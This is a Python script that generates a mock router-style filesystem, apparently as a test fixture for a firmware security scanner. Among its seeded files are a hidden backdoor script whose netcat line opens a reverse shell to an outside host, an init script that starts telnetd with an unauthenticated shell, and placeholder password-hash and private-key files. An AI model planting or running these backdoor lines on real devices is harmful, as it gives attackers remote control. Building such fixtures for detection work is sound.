from pathlib import Path

DEMO_FILES = {
    "etc/passwd": "root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000:admin:/home/admin:/bin/sh\n",
    "etc/shadow": "root:$1$demo$abcdefghijklmnopqrstuv:18000:0:99999:7:::\n",
    "etc/init.d/S50telnet": "#!/bin/sh\ntelnetd -l /bin/sh &\n",
    "etc/config/network": "lan_ip=192.168.1.1\nwan_dns=8.8.8.8\n",
    "www/cgi-bin/upload.cgi": "#!/bin/sh\necho Content-type: text/html\n",
    "bin/busybox": "ELF_PLACEHOLDER_BUSYBOX_BINARY",
    "sbin/telnetd": "ELF_PLACEHOLDER_TELNETD_BINARY",
    "usr/bin/wget": "ELF_PLACEHOLDER_WGET_BINARY",
    "usr/sbin/httpd": "ELF_PLACEHOLDER_HTTPD_BINARY",
    "var/log/messages": "system boot ok\n",
    "tmp/.hidden_backdoor.sh": "#!/bin/sh\nnc -e /bin/sh 203.0.113.55 4444 &\n",
    "etc/server.key": "-----BEGIN RSA PRIVATE KEY-----\nDEMOKEYDATA\n-----END RSA PRIVATE KEY-----\n",
}


def generate_demo_filesystem(target_dir: Path) -> int:
    target_dir.mkdir(parents=True, exist_ok=True)
    created = 0
    for relative_path, content in DEMO_FILES.items():
        full_path = target_dir / relative_path
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.write_text(content)
        created += 1
    return created
